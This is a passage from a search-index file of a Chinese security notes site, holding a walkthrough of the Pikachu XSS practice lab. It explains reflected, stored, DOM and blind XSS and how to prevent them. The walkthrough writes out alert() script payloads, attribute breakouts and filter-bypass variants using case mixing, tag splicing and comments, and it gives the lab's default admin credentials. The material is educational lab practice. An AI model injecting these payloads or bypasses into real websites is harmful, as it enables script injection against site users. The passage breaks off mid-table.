\u5f62\u6210XSS\u6f0f\u6d1e\u7684\u4e3b\u8981\u539f\u56e0\u662f\u7a0b\u5e8f\u5bf9\u8f93\u5165\u548c\u8f93\u51fa\u6ca1\u6709\u505a\u5408\u9002\u7684\u5904\u7406\uff0c\u5bfc\u81f4\u201c\u7cbe\u5fc3\u6784\u9020\u201d\u7684\u5b57\u7b26\u8f93\u51fa\u5728\u524d\u7aef\u65f6\u88ab\u6d4f\u89c8\u5668\u5f53\u4f5c\u6709\u6548\u4ee3\u7801\u89e3\u6790\u6267\u884c\u4ece\u800c\u4ea7\u751f\u5371\u5bb3\u3002 \u56e0\u6b64\u5728XSS\u6f0f\u6d1e\u7684\u9632\u8303\u4e0a\uff0c\u4e00\u822c\u4f1a\u91c7\u7528\u201c\u5bf9\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u201d\u548c\u201c\u8f93\u51fa\u8fdb\u884c\u8f6c\u4e49\u201d\u7684\u65b9\u5f0f\u8fdb\u884c\u5904\u7406:   \u8f93\u5165\u8fc7\u6ee4\uff1a\u5bf9\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\uff0c\u4e0d\u5141\u8bb8\u53ef\u80fd\u5bfc\u81f4XSS\u653b\u51fb\u7684\u5b57\u7b26\u8f93\u5165;   \u8f93\u51fa\u8f6c\u4e49\uff1a\u6839\u636e\u8f93\u51fa\u70b9\u7684\u4f4d\u7f6e\u5bf9\u8f93\u51fa\u5230\u524d\u7aef\u7684\u5185\u5bb9\u8fdb\u884c\u9002\u5f53\u8f6c\u4e49;</p> <p>\u4f60\u53ef\u4ee5\u901a\u8fc7\u201cCross-Site Scripting\u201d\u5bf9\u5e94\u7684\u6d4b\u8bd5\u680f\u76ee\uff0c\u6765\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\u8be5\u6f0f\u6d1e\u3002</p> <p>\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u6d4b\u8bd5\u6d41\u7a0b: \u2460\u5728\u76ee\u6807\u7ad9\u70b9\u4e0a\u627e\u5230\u8f93\u5165\u70b9,\u6bd4\u5982\u67e5\u8be2\u63a5\u53e3,\u7559\u8a00\u677f\u7b49; \u2461\u8f93\u5165\u4e00\u7ec4\u201d\u7279\u6b8a\u5b57\u7b26+\u552f\u4e00\u8bc6\u522b\u5b57\u7b26\u201d, \u70b9\u51fb\u63d0\u4ea4\u540e,\u67e5\u770b\u8fd4\u56de\u7684\u6e90\u7801\uff0c\u662f\u5426\u6709\u505a\u5bf9\u5e94\u7684\u5904\u7406; \u2462\u901a\u8fc7\u641c\u7d22\u5b9a\u4f4d\u5230\u552f\u4e00\u5b57\u7b26\uff0c\u7ed3\u5408\u552f\u4e00\u5b57\u7b26\u524d\u540e\u8bed\u6cd5\u786e\u8ba4\u662f\u5426\u53ef\u4ee5\u6784\u9020\u6267\u884cjs\u7684\u6761\u4ef6 (\u6784\u9020\u95ed\u5408) ; \u2463\u63d0\u4ea4\u6784\u9020\u7684\u811a\u672c\u4ee3\u7801(\u4ee5\u53ca\u5404\u79cd\u7ed5\u8fc7\u59ff\u52bf)\uff0c\u770b\u662f\u5426\u53ef\u4ee5\u6210\u529f\u6267\u884c\uff0c\u5982\u679c\u6210\u529f\u6267\u884c\u5219\u8bf4\u660e\u5b58\u5728XSS\u6f0f\u6d1e;</p> <p>\u63d0\u793a\uff1a 1.\u4e00\u822c\u67e5\u8be2\u63a5\u53e3\u5bb9\u6613\u51fa\u73b0\u53cd\u5c04\u578bXSS ,\u7559\u8a00\u677f\u5bb9\u6613\u51fa\u73b0\u5b58\u50a8\u578bXSS ; 2.\u7531\u4e8e\u540e\u53f0\u53ef\u80fd\u5b58\u5728\u8fc7\u6ee4\u63aa\u65bd\uff0c\u6784\u9020\u7684script\u53ef\u80fd\u4f1a\u88ab\u8fc7\u6ee4\u6389,\u800c\u65e0\u6cd5\u751f\u6548\u6216\u8005\u73af\u5883\u9650\u5236\u4e86\u6267\u884c(\u6d4f\u89c8\u5668) ; 3.\u901a\u8fc7\u53d8\u5316\u4e0d\u540c\u7684script ,\u5c1d\u8bd5\u7ed5\u8fc7\u540e\u53f0\u8fc7\u6ee4\u673a\u5236;</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#2x01-xssget","title":"2x01 \u53cd\u5c04\u578bxss(get)","text":"<ol> <li>\u6211\u4eec\u8fdb\u5165\u9776\u573a\u754c\u9762\uff0c\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165;\"\u2019&lt;&gt;9999\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u8f93\u51fa\u201cwho is ;\"\u2019&lt;&gt;9999,i don't care!\u201d</li> <li>\u6211\u4eec\u67e5\u770b\u7f51\u7ad9\u6e90\u4ee3\u7801\uff0c\u641c\u7d22\u201c123999\u201d\uff0c\u53d1\u73b0\u201c;\"\u2019&lt;&gt;9999\u201d\u5b57\u7b26\u4e32\u76f4\u63a5\u5d4c\u5165\u5728\u4e86\u7f51\u9875\u7684\u6e90\u4ee3\u7801\u4e2d\uff0c\u4e5f\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u6545\u731c\u6d4b\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u6709\u7279\u5b9a\u529f\u80fd\u7684JavaScript\u8bed\u53e5\u53ef\u80fd\u4e5f\u4f1a\u88ab\u8fd4\u56de\u6765\u3002</li> <li>\u6545\u6211\u4eec\u5c1d\u8bd5\u5728\u8f93\u5165\u6846\u8f93\u5165\u4e00\u4e9b\u4f1a\u4f7f\u6d4f\u89c8\u5668\u505a\u51fa\u67d0\u4e9b\u5e94\u7b54\u7684\u4ee3\u7801\uff0c\u5982<code>&lt;script&gt;alert('123')&lt;/script&gt;</code>\u3002\u4f46\u662f\u8fd9\u65f6\u4f1a\u51fa\u73b0\u7684\u95ee\u9898\u662f\u8be5\u8f93\u5165\u6846\u6709\u8f93\u5165\u6700\u5927\u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u9650\u5236\uff0c\u4e0d\u8fc7\u8fd9\u4e5f\u4e0d\u662f\u95ee\u9898\uff0c\u6211\u4eec\u5728\u5f00\u53d1\u8005\u5de5\u5177\u4e2d\u5c06\u8be5\u8f93\u5165\u6846\u7684\u9650\u5236\u753120\u6539\u4e3a20000\uff0c\u7ee7\u7eed\u8f93\u5165\u3002 </li> <li>\u8f93\u5165\u4f1a\u70b9\u51fb\u201csubmit\u201d\uff0c\u5728\u76f8\u5e94\u56de\u6765\u7684\u9875\u9762\u4e2d\uff0c\u786e\u5b9e\u5f39\u51fa\u4e86\u201c123\u201d\u7684\u7a97\u53e3\u3002</li> <li>\u6545\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6b64\u7f51\u7ad9\u5b58\u5728XSS\u6f0f\u6d1e\uff0c\u4f46\u662f\u8be5xss\u6f0f\u6d1e\u4e3a\u53cd\u5c04\u6027\u6f0f\u6d1e\uff0c\u4e5f\u5c31\u662f\u8bf4\u662f\u6682\u65f6\u7684\uff0c\u4f1a\u968f\u7740\u9875\u9762\u7684\u5237\u65b0\u800c\u6d88\u5931\uff0c\u4f46\u662f\u8be5\u53cd\u5c04\u6027\u4e3aget\u578b\uff0c\u5176\u63d0\u4ea4\u7684\u6570\u636e\u4fdd\u5b58\u5728URL\u4e2d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u5f53\u6211\u4eec\u518d\u4e00\u6b21\u8bbf\u95ee\u6b64\u65f6\u7684URL\uff0c\u4f9d\u65e7\u4f1a\u5f39\u51fa\u201c123\u201d\u5f39\u7a97\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#2x02-xsspost","title":"2x02 \u53cd\u5c04\u6027xss(post)","text":"<ol> <li>\u6211\u4eec\u5148\u70b9\u4e00\u4e0b\u63d0\u793a</li> <li>\u542c\u4ece\u63d0\u793a\uff0c\u8d26\u6237admin\uff0c\u5bc6\u7801123456 \u767b\u5f55\u3002\u767b\u9646\u540e\u754c\u9762\u5982\u56fe\u6240\u793a\uff1a</li> <li>\u4e0e\u201c2x01 \u53cd\u5c04\u578bxss(get)\u201d\u4e00\u6837\uff0c\u6211\u4eec\u63d0\u4ea4<code>&lt;script&gt;alert('123')&lt;/script&gt;</code>,\u70b9\u51fb\u63d0\u4ea4\uff0c\u5f39\u51fa\u5982\u4e0b\u754c\u9762\uff1a</li> <li>\u8bf4\u660exss\u6f0f\u6d1e\u5b58\u5728\uff0c\u4f46\u662f\u89c2\u5bdf\u6b64URL\uff0c\u53d1\u73b0\u63d0\u4ea4\u4fe1\u606f\u5e76\u6ca1\u6709\u53cd\u6620\u5728URL\u4e2d\uff0c\u800c\u8fd9\u4e5f\u662fPOST\u4e0eGET\u7684\u533a\u522b: GET\u548cPOST\u5178\u578b\u533a\u522b: GET\u662f\u4ee5url\u65b9\u5f0f\u63d0\u4ea4\u6570\u636e;POST\u662f\u4ee5\u8868\u5355\u65b9\u5f0f\u5728\u8bf7\u6c42\u4f53\u91cc\u9762\u63d0\u4ea4; GET\u65b9\u5f0f\u7684XSS\u6f0f\u6d1e\u66f4\u52a0\u5bb9\u6613\u88ab\u5229\u7528, \u4e00\u822c\u5229\u7528\u7684\u65b9\u5f0f\u662f\u5c06\u5e26\u6709\u8de8\u7ad9\u811a\u672c\u7684URL\u4f2a\u88c5\u540e\u53d1\u9001\u7ed9\u76ee\u6807\uff0c\u800cPOST\u65b9\u5f0f\u7531\u4e8e\u662f\u4ee5\u8868\u5355\u65b9\u5f0f\u63d0\u4ea4,\u65e0\u6cd5\u76f4\u63a5\u4f7f\u7528URL\u65b9\u5f0f\u8fdb\u884c\u653b\u51fb</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#2x03-xss","title":"2x03 \u5b58\u50a8\u578bxss","text":"<ol> <li>\u5b58\u50a8\u578bXSS\u6f0f\u6d1e\u8ddf\u53cd\u5c04\u578b\u5f62\u6210\u7684\u539f\u56e0\u4e00\u6837,\u4e0d\u540c\u7684\u662f\u5b58\u50a8\u578bXSS\u4e0b\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u811a\u672c\u6ce8\u5165\u5230\u540e\u53f0\u5b58\u50a8\u8d77\u6765\uff0c\u6784\u6210\u66f4\u52a0\u6301\u4e45\u7684\u5371\u5bb3,\u56e0\u6b64\u5b58\u50a8\u578bXSS\u4e5f\u79f0\u201c\u6c38\u4e45\u578b\u201dXSS\u3002 \u6211\u4eec\u5c1d\u8bd5\u63d0\u4ea4\u201c\u3001123\u201d\uff0c\u53d1\u73b0\u5728\u5237\u65b0\u540e\uff0c\u8be5\u5b57\u7b26\u4e32\u4e5f\u4f1a\u4e00\u76f4\u5b58\u5728\u5728\u7f51\u9875\u4e2d\u3002</li> <li>\u6545\u6211\u4eec\u5728\u7559\u8a00\u677f\u4e2d\u8f93\u5165<code>&lt;script&gt;alert('123')&lt;/script&gt;</code>\uff0c\u63d0\u4ea4\u3002\u53d1\u73b0\u6210\u529f\u5f39\u51fa123\uff0c\u6211\u4eec\u5173\u95ed\u540e\uff0c\u53d1\u73b0\u7f51\u9875\u4e2d\u7684\u7559\u8a00\u5217\u8868\u4e2d\u4fdd\u5b58\u4e86\u6211\u4eec\u63d0\u4ea4\u7684\u811a\u672c\u4ee3\u7801\uff08\u56e0\u4e3a\u4e00\u4e9b\u539f\u56e0\u6ca1\u6709\u663e\u793a\u51fa\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u201c\u5220\u9664\u201d\u6309\u94ae\u5224\u65ad\uff09\u3002  </li> <li>\u6211\u4eec\u5c1d\u8bd5\u5237\u65b0\u9875\u9762\uff0c\u53d1\u73b0\u4e0e\u524d\u4e24\u8282\u4e0d\u540c\u7684\u662f\u4f9d\u65e7\u4f1a\u5f39\u51fa\u7a97\u53e3\uff0c\u8fd9\u662f\u56e0\u4e3a\u9875\u9762\u5237\u65b0\u540e\uff0c\u7f51\u9875\u4ecd\u4f1a\u518d\u6b21\u52a0\u8f7d\u4e00\u4e0b\u6211\u6211\u4eec\u4e4b\u524d\u63d0\u4ea4\u7684\u811a\u672c\uff0c\u6545\u4ecd\u4f1a\u5f39\u51fa\u5f39\u7a97\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#2x04-domxss","title":"2x04 DOM\u578bxss","text":"<p>\u5728\u6253\u9776\u573a\u524d\uff0c\u6211\u4eec\u5148\u719f\u6089\u4e00\u4e0b\u4ec0\u4e48\u662fDOM\uff0c\u70b9\u6211\u67e5\u770bW3School\u7684DOM\u89e3\u91ca\uff0cHTML DOM \u65b9\u6cd5\u662f\u6211\u4eec\u80fd\u591f\uff08\u5728 HTML \u5143\u7d20\u4e0a\uff09\u6267\u884c\u7684\u52a8\u4f5c\uff0cHTML DOM \u5c5e\u6027\u662f\u60a8\u80fd\u591f\u8bbe\u7f6e\u6216\u6539\u53d8\u7684 HTML \u5143\u7d20\u7684\u503c\u3002\u5177\u4f53\u4fee\u6539\u8bed\u53e5\u51fb\u6b64\u5904\u67e5\u770b \u901a\u8fc7JavaScript,\u53ef\u4ee5\u91cd\u6784\u6574\u4e2aHTML\u6587\u6863\u3002\u60a8\u53ef\u4ee5\u6dfb\u52a0\u3001\u79fb\u9664\u3001\u6539\u53d8\u6216\u91cd\u6392\u9875\u9762\u4e0a\u7684\u9879\u76ee\u3002\u8981\u6539\u53d8\u9875\u9762\u7684\u67d0\u4e2a\u4e1c\u897f\uff0cJavaScript\u5c31\u9700\u8981\u83b7\u5f97\u5bf9HTML\u6587\u6863\u4e2d\u6240\u6709\u5143\u7d20\u8fdb\u884c\u8bbf\u95ee\u7684\u5165\u53e3\u3002\u8fd9\u4e2a\u5165\u53e3\uff0c\u8fde\u540c\u5bf9HTML\u5143\u7d20\u8fdb\u884c\u6dfb\u52a0\u3001\u79fb\u52a8\u3001\u6539\u53d8\u6216\u79fb\u9664\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff0c\u90fd\u662f\u901a\u8fc7\u6587\u6863\u5bf9\u8c61\u6a21\u578b\u6765\u83b7\u5f97\u7684(DOM)\u6240\u4ee5\uff0c\u4f60\u53ef\u4ee5\u628aDOM\u7406\u89e3\u4e3aJS\u8bbf\u95eeHTML\u7684\u6807\u51c6\u7f16\u7a0b\u63a5\u53e3\u3002DOM\u662f\u7eaf\u524d\u7aef\u7684\u64cd\u4f5c 1. \u6211\u4eec\u5728DOM\u578bxss\u7684\u8f93\u5165\u6846\u4e2d\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\u4e32\uff0c\u663e\u793a\u7ed3\u679c\u4e3a\u201cwhat do you see?\u201d\uff0c\uff08\u6b64\u5904\u6211\u4eec\u4ee512345\u4e3a\u4f8b\uff09</p> <ol> <li>\u6253\u5f00\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u641c\u7d22\u201cwhat do you see?\u201d \u76f8\u5e94\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a PHP<pre><code>            &lt;div id=\"xssd_main\"&gt;\n                &lt;script&gt;\n                    function domxss()\n                    {\n                        var str = document.getElementById(\"text\").value;\n                        document.getElementById(\"dom\").innerHTML = \"&lt;a href='\"+str+\"'&gt;what do you see?&lt;/a&gt;\";\n                    }\n                    //\u8bd5\u8bd5\uff1a'&gt;&lt;img src=\"#\" onmouseover=\"alert('xss')\"&gt;\n                    //\u8bd5\u8bd5\uff1a' onclick=\"alert('xss')\"&gt;,\u95ed\u5408\u6389\u5c31\u884c\n                &lt;/script&gt;\n                &lt;!--&lt;a href=\"\" onclick=('xss')&gt;--&gt;\n                &lt;input id=\"text\" name=\"text\" type=\"text\"  value=\"\" /&gt;\n                &lt;input id=\"button\" type=\"button\" value=\"click me!\" onclick=\"domxss()\" /&gt;\n                &lt;div id=\"dom\"&gt;&lt;/div&gt;\n            &lt;/div&gt;\n</code></pre></li> <li>\u6b64\u65f6\uff0c<code>document.getElementById(\"dom\").innerHTML = \"&lt;a href='\"+str+\"'&gt;what do you see?&lt;/a&gt;\";</code> \u6b64\u8bed\u53e5\u4e3a\u6211\u4eec\u7684\u5206\u6790\u5bf9\u8c61\uff0c\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u63d0\u4ea4\u7684\u5b57\u7b26\u4e32\u88ab\u8d4b\u7ed9\u4e86\u201cstr\u201d\uff0c\u6545\u5224\u65ad\u6211\u4eec\u5728\u8f93\u5165\u6846\u8f93\u5165\u7684\u4e1c\u897f\u88ab\u62fc\u63a5\u5728\u201c+str+\u201d\u5904\u3002\u6240\u4ee5\u6211\u4eec\u8981\u53bb\u5c1d\u8bd5\u628a\u8fd9\u91cc\u7684a\u6807\u7b7e\u95ed\u5408\uff0c\u5e76\u5f39\u51fa\u4e00\u4e2a\u5f39\u7a97\u3002\u6211\u4eec\u7528<code>#\u2018</code>\u6765\u95ed\u5408\u524d\u9762\u7684\u5355\u5f15\u53f7\uff0c\u7528<code>&gt;</code>\u6765\u95ed\u5408\u524d\u9762\u7684&lt;\u3002 \u6240\u4ee5\u6211\u4eec\u8f93\u5165\uff1a<code>#' onclick=\"alert(123)\"&gt;</code> \u6b64\u65f6\u6b64\u5904\u7684\u5b8c\u6574\u4ee3\u7801\u4e3a\uff1a PHP<pre><code>&lt;a href='#' onclick=\"alert(123)\"&gt;'&gt;what do you see?&lt;/a&gt;\n</code></pre> \u70b9\u51fb\u63d0\u4ea4\u540e\u9875\u9762\u5982\u56fe\u6240\u793a\uff1a</li> <li>\u8fd9\u65f6\u5019\u6211\u4eec\u70b9\u51fbwhat do you see?\uff0c\u5f39\u7a97\u6210\u529f\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#2x05-domxss","title":"2x05 DOM\u578bxss","text":"<p>\u4e0e\u4e0a\u4e00\u5173\u7684\u533a\u522b\u5c31\u662f\u8fd9\u6b21\u662f\u4eceurl\u4e2d\u83b7\u53d6\u6211\u4eec\u8f93\u5165\u7684text\u53c2\u6570\u7684\uff0c\u8fd9\u5c31\u7c7b\u4f3c\u53cd\u5c04\u578b\uff0c\u5176\u4ed6\u540c\u4e0a\uff0c\u6784\u9020\u95ed\u5408\u5373\u53ef\u3002 \u5148\u8d34\u51fa\u7f51\u9875\u6e90\u4ee3\u7801\uff1a</p> <p>PHP<pre><code>            &lt;div id=\"xssd_main\"&gt;\n                &lt;script&gt;\n                    function domxss(){\n                        var str = window.location.search;\n                        var txss = decodeURIComponent(str.split(\"text=\")[1]);\n                        var xss = txss.replace(/\\+/g,' ');\n                        //alert(xss);\n\n                        document.getElementById(\"dom\").innerHTML = \"&lt;a href='\"+xss+\"'&gt;\u5c31\u8ba9\u5f80\u4e8b\u90fd\u968f\u98ce,\u90fd\u968f\u98ce\u5427&lt;/a&gt;\";\n                    }\n                    //\u8bd5\u8bd5\uff1a'&gt;&lt;img src=\"#\" onmouseover=\"alert('xss')\"&gt;\n                    //\u8bd5\u8bd5\uff1a' onclick=\"alert('xss')\"&gt;,\u95ed\u5408\u6389\u5c31\u884c\n                &lt;/script&gt;\n                &lt;!--&lt;a href=\"\" onclick=('xss')&gt;--&gt;\n                &lt;form method=\"get\"&gt;\n                &lt;input id=\"text\" name=\"text\" type=\"text\"  value=\"\" /&gt;\n                &lt;input id=\"submit\" type=\"submit\" value=\"\u8bf7\u8bf4\u51fa\u4f60\u7684\u4f24\u5fc3\u5f80\u4e8b\"/&gt;\n                &lt;/form&gt;\n                &lt;div id=\"dom\"&gt;&lt;/div&gt;\n            &lt;/div&gt;\n</code></pre>  - \u8f93\u5165\u6846\u8f93\u5165<code>#' onclick=\"alert('123')\"&gt;</code>\uff0c\u4e4b\u540e\u4f9d\u6b21\u70b9\u51fb\uff0c\u5f39\u7a97\u6210\u529f\u3002\uff08\u6ce8\u610f\u89c2\u5bdfURL\uff09  ### 2x06 xss\u76f2\u6253  \u76f2\u6253\u662f\u4e00\u79cd\u653b\u51fb\u573a\u666f\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u6709\u540e\u53f0\u4f1a\u770b\u5230\u524d\u7aef\u8f93\u5165\u7684\u5185\u5bb9\u3002\u4ece\u524d\u7aef\u65e0\u6cd5\u5224\u65ad\u662f\u5426\u5b58\u5728XSS\u3002 \u6211\u4eec\u76f4\u63a5\u5f80\u91cc\u9762\u63d2XSS\u4ee3\u7801\uff0c\u7136\u540e\u7b49\u5f85,\u53ef\u80fd\u4f1a\u6709\u60ca\u559c\uff01\u7531\u4e8e\u662f\u540e\u7aef,\u53ef\u80fd\u5b89\u5168\u8003\u8651\u4e0d\u592a\u4e25\u683c\u3002\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u65f6\uff0c\u5c31\u4f1a\u88ab\u653b\u51fb\u5230\u3002  - \u6211\u4eec\u5148\u5728\u8f93\u5165\u6846\u8f93\u5165<code>&lt;script&gt;alert('123')&lt;/script&gt;</code>\u5236\u9020\u4e00\u4e2a\u5f39\u7a97  - \u70b9\u51fb\u63d0\u793a\uff0c\u9776\u573a\u63d0\u793a\u6211\u4eec\u767b\u5f55\u540e\u53f0\u770b\u6709\u4ec0\u4e48\u60c5\u51b5\u53d1\u751f\uff0c\u6211\u4eec\u767b\u5f55\uff0c\u8d26\u53f7admin\uff0c\u5bc6\u7801123456   - \u5982\u4e0a\u56fe\uff0c\u5f39\u7a97\u6210\u529f\uff0c\u4e14\u6211\u4eec\u7684\u63d0\u4ea4\u5185\u5bb9\u4f1a\u4e00\u76f4\u4fdd\u7559\u5728\u540e\u53f0\uff0c\u6bcf\u5f53\u6211\u4eec\u5237\u65b0\u540e\u53f0\u754c\u9762\uff0c\u90fd\u4f1a\u518d\u4e00\u6b21\u5f39\u7a97\u3002 \u8fd9\u4fbf\u662fxss\u76f2\u6253\uff0c\u653b\u51fb\u8005\u5e76\u4e0d\u77e5\u9053\u4f1a\u4e0d\u4f1a\u4f5c\u7528\uff0c\u4ee3\u7801\u662f\u5426\u4f1a\u5728\u540e\u53f0\u8f93\u51fa\uff0c\u4f46\u5982\u679c\u6210\u529f\u653b\u51fb\uff0c\u4e5f\u5c31\u2026\u2026\u2026\u2026  ### 2x07 xss\u4e4b\u8fc7\u6ee4  XSS\u7ed5\u8fc7-\u8fc7\u6ee4-\u8f6c\u6362  - \u524d\u7aef\u9650\u5236\u7ed5\u8fc7\uff0c\u76f4\u63a5\u6293\u5305\u91cd\u653e\uff0c\u6216\u8005\u4fee\u6539html\u524d\u7aef\u4ee3\u7801  - \u5927\u5c0f\u5199\uff0c\u6bd4\u5982: <code>&lt;SCRIPT&gt; aLeRT(111)&lt;/sCRIpt&gt;</code>  - \u62fc\u51d1: <code>&lt;scri&lt;script&gt; pt&gt; alert(111)&lt;/scri&lt;/script&gt; pt&gt;</code>  - \u4f7f\u7528\u6ce8\u91ca\u8fdb\u884c\u5e72\u6270: <code>&lt;scri&lt;!--test--&gt; pt&gt; alert(111)&lt;/sc &lt;--test--&gt; ript&gt;</code></p> <p>\u4e2a\u4eba\u7406\u89e3\uff0c\u540e\u53f0\u4f1a\u5bf9<code>&lt;script&gt;</code>\u4e4b\u7c7b\u7684\u7279\u6b8a\u5b57\u7b26\u505a\u9650\u5236\uff0c\u4e0d\u4f1a\u8ba9\u5176\u8f93\u51fa\u503c\u540e\u7aef\u4ee5\u786e\u4fdd\u5b89\u5168\uff0c\u4f46\u662f\u6b64\u7c7b\u6807\u7b7e\u53ef\u4ee5\u5404\u79cd\u7f16\u7801\uff0c\u7f16\u7801\u540e\u540e\u53f0\u4e0d\u4e00\u5b9a\u4f1a\u8fdb\u884c\u8fc7\u6ee4\uff0c\u800c\u5f53\u6d4f\u89c8\u5668\u5bf9\u8be5\u7f16\u7801\u8fdb\u884c\u8bc6\u522b\u65f6\uff0c\u4f1a\u7ffb\u8bd1\u6210\u6b63\u5e38\u7684\u6807\u7b7e\uff0c\u4ece\u800c\u6267\u884c\u3002\u4f46\u662f\u5728\u4f7f\u7528\u7f16\u7801\u65f6\u9700\u8981\u6ce8\u610f\u7f16\u7801\u5728\u8f93\u51fa\u70b9\u662f\u5426\u4f1a\u88ab\u6b63\u5e38\u8bc6\u522b\u548c\u7ffb\u8bd1\u3002 \u6211\u4eec\u8981\u505a\u7684\u4fbf\u662f\u7ed5\u8fc7\u6b64\u7c7b\u9650\u5236\uff0c\u5bf9\u4e8e\u901a\u914d\u7b26\u6216\u6b63\u5219\u8868\u8fbe\u5f0f\u7b49\u9650\u5236\u65b9\u5f0f\uff0c\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u53bb\u901a\u8fc7\u5927\u5c0f\u5199\u3001\u62fc\u51d1\u3001\u4f7f\u7528\u6ce8\u91ca\u5e72\u6270\u7b49\u624b\u6bb5\u5e72\u6270\u5176\u5bf9<code>&lt;script&gt;</code>\u7684\u5224\u65ad\u3002  \u4e3e\u4f8b\uff1a</p> <p>JavaScript<pre><code>&lt; img src=x onerror=\"alert('123')\"\n</code></pre> \u6211\u4eec\u5bf9\u201calert(\u2018123\u2019 )\u201d\u8fdb\u884cURL\u7f16\u7801\uff0c\u7ed3\u679c\u4e3aalert(%E2%80%98123%E2%80%99%20) \u4f46\u662f\u8fd9\u6837\u4f9d\u65e7\u4e0d\u884c\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u7f16\u7801\u4e0d\u4f1a\u88ab\u6b63\u5e38\u89e3\u7801\u3002 1. \u5728xss\u8fc7\u6ee4\u7684\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u4ee3\u7801:<code>&lt;script&gt;12..</code>\u63d0\u4ea4\u540e\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u5982\u4e0b\u56fe\uff1a  2. \u6211\u4eec\u53d1\u73b0\uff0c\u6211\u4eec\u8f93\u5165\u7684<code>&lt;script&gt;</code>\u5b57\u6837\u5e76\u6ca1\u6709\u88ab\u8f93\u5165\u5728\u6e90\u4ee3\u7801\u4e2d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8be5\u5b57\u6837\u88ab\u8fc7\u6ee4\u4e86\uff0c     \u6211\u4eec\u73b0\u5728\u5c1d\u8bd5\u7528\u5927\u5c0f\u5199\u53bb\u8fc7\u6ee4\uff1a<code>&lt;scRIpt&gt;alert('123')&lt;/sCRIpt&gt;</code>\u63d0\u4ea4\u4e4b\u540e\u6210\u529f\u5f39\u7a97\u3002\u67e5\u770b\u6e90\u4ee3\u7801\uff0cscipt\u4e5f\u786e\u5b9e\u8f93\u51fa\u6765\u5728\u4e86\u5176\u4e2d\u3002</p> <p></p> <ol> <li>\u5c1d\u8bd5\u62fc\u51d1\uff0c\u53d1\u73b0\u4f9d\u65e7\u88ab\u8fc7\u6ee4\uff0c\u800c\u6ce8\u91ca\u5e72\u6270\u4e5f\u540c\u6837\u4e0d\u6210\u529f\uff0c\u8fd9\u8bf4\u660e\u6709\u4e9b\u5e72\u6270\u80fd\u7ed5\u8fc7\u8fc7\u6ee4\u800c\u6709\u4e9b\u4e0d\u80fd\uff0c\u8fd9\u53d6\u51b3\u4e8e\u8be5\u7f51\u7ad9\u7684\u8fc7\u6ee4\u63aa\u65bd\u3002\u8fc7\u6ee4\u5e72\u6270\u7684\u65b9\u6cd5\u5343\u5947\u767e\u602a\uff0c\u8fd9\u4e00\u8282\u53ea\u662f\u7b80\u5355\u9610\u8ff0\u4e86\u8fd9\u4e09\u79cd\u3002  ### 2x08 xss\u4e4bhtmlspecialchars  \u5728\u5b8c\u6210\u6b64\u8282\u7684\u653b\u51fb\u524d\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u4e00\u4e0bhtmlspecialchars()\u51fd\u6570  htmlspecialchars()\u51fd\u6570\u628a\u9884\u5b9a\u4e49\u7684\u5b57\u7b26\u8f6c\u6362\u4e3aHTML\u5b9e\u4f53\u3002  \u9884\u5b9a\u4e49\u7684\u5b57\u7b26\u662f:</li> </ol> <p>&amp;(\u548c\u53f7)\u6210\u4e3a&amp; \"(\u53cc\u5f15\u53f7)\u6210\u4e3a\" '(\u5355\u5f15\u53f7)\u6210\u4e3a' &lt;(\u5c0f\u4e8e)\u6210\u4e3a&lt; \u2018&gt;\u2019(\u5927\u4e8e)\u6210\u4e3a&gt;</p> <p>\u53ef\u7528\u7684\u5f15\u53f7\u7c7b\u578b:</p> <p>ENT_ COMPAT -\u9ed8\u8ba4\u3002\u4ec5\u7f16\u7801\u53cc\u5f15\u53f7\u3002 ENT QUOTES -\u7f16\u7801\u53cc\u5f15\u53f7\u548c\u5355\u5f15\u53f7\u3002 ENT NOQUOTES -\u4e0d\u7f16\u7801\u4efb\u4f55\u5f15\u53f7\u3002</p> <p>\u8bed\u6cd5\uff1ahtmlspecialchars(string,flags,character-set,double_encode) | \u53c2\u6570 | \u63cf\u8ff0 | |--|--| | string | \u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\u3002 | | flags | 